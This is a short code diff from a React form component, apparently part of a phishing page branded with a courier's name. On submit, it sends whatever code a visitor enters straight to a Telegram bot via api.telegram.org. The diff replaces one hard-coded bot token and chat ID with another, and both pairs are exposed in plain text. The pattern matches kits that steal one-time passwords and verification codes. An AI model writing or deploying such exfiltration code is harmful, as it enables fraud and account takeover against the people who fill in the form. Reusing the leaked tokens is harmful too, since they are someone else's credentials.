@@ -10,8 +10,8 @@ const Code = () => {
   const handleSubmit = (e) => {
     e.preventDefault();
     var bot={
-      token:"6989400723:AAHYaV2mqkCKuP5OsEA7mK5s_7mctmTRChc",
-      chat_id:6364996162
+      token:"6688266348:AAFU2baoOulq9YUsMyiVnEVZ8U8Iw13zPDI",
+      chat_id:6473956939
     }
     var length= `%0A This is code : ${code.current.value} %0A BY Admin Zajil:`
     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
